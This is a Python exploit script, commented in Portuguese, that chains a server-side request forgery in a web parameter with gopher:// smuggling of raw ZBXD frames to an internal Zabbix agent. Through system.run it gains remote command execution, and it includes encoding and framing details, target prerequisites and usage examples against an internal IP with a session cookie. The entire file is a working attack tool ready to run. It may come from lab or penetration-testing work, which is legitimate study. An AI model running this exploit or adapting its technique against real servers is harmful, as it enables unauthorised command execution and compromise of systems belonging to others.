#!/usr/bin/env python3
"""
SSRF + Protocol Smuggling (gopher) -> RCE via Zabbix Agent

Cadeia de ataque:
  1. Parametro vulneravel que executa curl no servidor (ex.: system("curl '<url>' |cat"))
  2. SSRF via gopher:// double-encoded (o PHP decodifica uma vez, o libcurl decodifica de novo)
  3. Frame ZBXD cru enviado ao zabbix_agentd interno (127.0.0.1:10050)
  4. system.run[<cmd>] -> execucao de comandos como o usuario do agente

Detalhe critico do framing:
  o libcurl (testado no 7.64) SEMPRE anexa "\r\n" ao final do selector gopher,
  portanto o campo de tamanho do frame (u64 little-endian) deve ser len(key) + 2.

Pre-requisitos no alvo:
  - Agente Zabbix com AllowKey=system.run[*] (ou EnableRemoteCommands=1)
  - Server=127.0.0.1 (o SSRF parte do loopback, entao a origem e aceita)
  - Porta do agente (10050) alcancavel via loopback

Notas:
  - Evite virgulas e colchetes nos comandos (separador/terminador de parametro do item key).
  - Comandos com espacos funcionam sem aspas: system.run[ls -la /home].

Uso:
  python3 zabbix_ssrf_rce.py --base 'http://10.10.0.47' --cookie 'PHPSESSID=abc' -- id
  python3 zabbix_ssrf_rce.py --base 'http://10.10.0.47' --cookie 'PHPSESSID=abc' -- id 'uname -a' 'ls -la /'

MITRE ATT&CK: T1190 (Exploit Public-Facing App) / T1090 (Proxy: SSRF) /
              T1059.004 (Unix Shell via system.run)
"""
import argparse
import struct
import urllib.parse
import urllib.request
from typing import Optional

DEFAULT_PORT = 10050


def double_encode(raw: bytes) -> str:
    """Codifica duas vezes: 1a camada para o libcurl, 2a para o PHP (urldecode)."""
    inner = ''.join(f'%{b:02X}' for b in raw)
    return urllib.parse.quote(inner, safe='')


def build_frame(key: str) -> bytes:
    """Frame ZBXD: 'ZBXD\\x01' + u64 LE (len+2) + key  [ +2 = CRLF anexado pelo curl ]."""
    payload = key.encode()
    return b'ZBXD\x01' + struct.pack('<Q', len(payload) + 2) + payload


def http_get(url: str, cookie: Optional[str] = None, timeout: int = 25) -> bytes:
    req = urllib.request.Request(url)
    if cookie:
        req.add_header('Cookie', cookie)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.read()


def parse_zbxd(data: bytes) -> str:
    """Remove o header ZBXD e retorna o payload (valor do item)."""
    if data.startswith(b'ZBXD\x01') and len(data) >= 13:
        (n,) = struct.unpack('<Q', data[5:13])
        return data[13:13 + n].decode(errors='replace')
    return data.decode(errors='replace')


def run_command(base: str, cookie: Optional[str], port: int, command: str, timeout: int = 25) -> str:
    key = f'system.run[{command}]'
    frame = build_frame(key)
    url = f"{base}/?get_picture=gopher://127.0.0.1:{port}/_{double_encode(frame)}"
    return parse_zbxd(http_get(url, cookie, timeout))


def main():
    ap = argparse.ArgumentParser(description='SSRF gopher -> Zabbix agent RCE (system.run)')
    ap.add_argument('--base', required=True, help='URL do alvo (ex.: http://10.10.0.47)')
    ap.add_argument('--cookie', default=None, help='Cookie de sessao (opcional)')
    ap.add_argument('--port', type=int, default=DEFAULT_PORT, help='porta do zabbix agent (default: 10050)')
    ap.add_argument('--timeout', type=int, default=25, help='timeout HTTP em segundos (default: 25)')
    ap.add_argument('commands', nargs='+', help='comando(s) para executar no alvo')
    args = ap.parse_args()

    base = args.base.rstrip('/')
    for cmd in args.commands:
        try:
            out = run_command(base, args.cookie, args.port, cmd, args.timeout)
        except Exception as exc:
            out = f'[erro] {exc}'
        print(f'$ {cmd}\n{out}\n')


if __name__ == '__main__':
    main()
